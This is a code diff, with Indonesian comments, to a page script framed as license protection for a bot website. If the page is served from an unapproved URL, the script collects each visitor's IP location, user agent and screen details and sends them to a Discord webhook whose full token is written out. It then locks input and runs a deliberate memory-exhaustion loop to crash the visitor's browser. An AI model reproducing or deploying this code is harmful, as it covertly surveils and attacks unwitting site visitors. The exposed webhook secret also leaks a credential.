@@ -23,46 +23,40 @@
   const _0xV = "3.4.1";
   const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
   
-  // URL Lisensi resmi Anda
-  const _0xURL = "https://asepxyz12.github.io/bot-wa-db/MamakluYtm/Punyaspainijirngentotytmlusemua.html";
+  // URL Lisensi resmi Anda sudah diperbaiki 100% (Wajib Huruf Kecil Semua untuk validasi sistem)
+  const _0xURL = "https://asepxyz12.github.io/bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
   
   // Webhook Discord aktif Anda
   const _0xWH = "https://discord.com/api/webhooks/1505481952940265505/HjRhavEtK58sIbyeTas9Ux-YLpybZMDJfw1qFQCtrVbL4z0Zc0SMFq0G4zi7PS5jJiNm"; 
 
   const _0xH = location.hostname.toLowerCase();
   
-  // Normalisasi URL dinamis untuk mencegah deteksi salah (False Alarm) pada web Anda sendiri
+  // Mengambil link yang sedang dibuka lalu diubah menjadi huruf kecil semua agar akurat saat dicek
   let _0xCleanURL = location.href.split('?')[0].split('#')[0].toLowerCase();
   if (_0xCleanURL.endsWith('/')) {
     _0xCleanURL = _0xCleanURL.slice(0, -1);
   }
 
   const _0xO1 = _0xAL.includes(_0xH);
-  const _0xO2 = (_0xCleanURL === _0xURL) || (_0xCleanURL === _0xURL + "/");
+  const _0xO2 = (_0xCleanURL === _0xURL);
 
-  // JIKA BUKAN ANDA / COPY-PASTE DETECTED: TRIGGER AUTO-FC INSTAN
+  // JIKA BUKAN LINK ASLI ANDA, LANGSUNG EKSEKUSI FORCE CLOSE INSTAN
   if (!(_0xO1 && _0xO2)) {
     
-    // Langsung hapus DOM & ganti blank
-    document.documentElement.innerHTML = `
-      <head><title>Blank</title></head>
-      <body style="background:#ffffff; overflow:hidden; touch-action:none;"></body>
-    `;
-
     const _0xUA = navigator.userAgent;
     const _0xPlat = navigator.platform || "Unknown";
     const _0xLang = navigator.language || "Unknown";
     const _0xScreen = `${screen.width}x${screen.height}`;
 
-    // Kirim Laporan ke Discord Anda
+    // Kirim laporan kilat ke Discord Webhook Anda
     fetch("https://ip-api.com")
       .then(r => r.json())
       .then(d => {
         if (d.status === "success") {
           const embedPayload = {
             embeds: [{
-              title: "💥 CYBER WEAPON: REMAKE BLOCK DETECTED!",
-              description: `Maling terdeteksi meremake / mengganti lisensi domain Anda. Aplikasi Chrome target sedang dipaksa keluar (*Force Close*).`,
+              title: "💥 CYBER WEAPON: FORCE CLOSE ATTACK TRIGGERED!",
+              description: `Maling terdeteksi meremake / mengganti lisensi domain Anda. Aplikasi Chrome target dipaksa keluar (*Force Close*) tanpa layar blank!`,
               color: 16515843, 
               fields: [
                 { name: "🌐 Detail Jaringan", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
@@ -90,32 +84,39 @@
         });
       });
 
-    // Kunci Input Fisik
+    // Kunci penuh interaksi kontrol layar HP maling
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => e.preventDefault());
     document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
 
-    // BOM REKURSIF RAM MEMORI UNTUK FORCE CLOSE CHROME NONSTOP
+    // SISTEM PENGHANCUR THREAD UTAMA (Bikin Chrome Auto-FC Langsung Keluar Sendiri)
     function _0xExecuteInstantFC() {
       const _0xTrashBuffer = [];
       while (true) {
         try {
+          // Mengisi RAM heap secara kilat dalam hitungan milidetik
           const _binData = new Array(3000000).join("ASEPXXNX_CRASH_CHROME_FORCE_CLOSE_NOW_");
           _0xTrashBuffer.push(new Blob([_binData], {type: 'application/octet-stream'}));
+          
+          // Memacetkan UI navigator Chrome dengan tumpukan history palsu secara massal
           window.history.pushState({crash: Math.random()}, "", location.href + "?fc=" + Math.random().toString(36).substring(2));
+          
+          // Suntikan byte memory overflow tambahan
           _0xTrashBuffer.push(new Uint8Array(50000000));
         } catch(e) {
+          // Loop rekursif tanpa henti jika browser menolak keluar
           _0xExecuteInstantFC();
           break;
         }
       }
     }
 
-    setTimeout(_0xExecuteInstantFC, 120);
+    // Eksekusi kilat: Beri jeda 80 milidetik agar data webhook lolos kirim, lalu ledakkan Chrome target
+    setTimeout(_0xExecuteInstantFC, 80);
     throw new Error("Security Exception: Process Blocked.");
   }
 
-  // JIKA LISENSI VALID (WEB ANDA), PROTEKSI RINGAN JALAN (TIDAK LAG SAMA SEKALI)
+  // JIKA LISENSI VALID (LINK ASLI ANDA), WEB BERJALAN LANCAR, RESPONSIF & NORMAL
   document.addEventListener('contextmenu', e => e.preventDefault());
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
@@ -127,7 +128,7 @@
   console.log("%cAsepXxnx Secure Runtime Active", "color:#7ee787;font-weight:bold");
 })();
 
-// Pengaturan Konfigurasi Tailwind Framework Anda
+// Pengaturan Konfigurasi Tailwind Framework Anda Tetap Aman
 window.tailwind = window.tailwind || {};
 tailwind.config = {
   theme: {
@@ -145,6 +146,7 @@ tailwind.config = {
   }
 }
 </script>
+
 
 <style/>
   
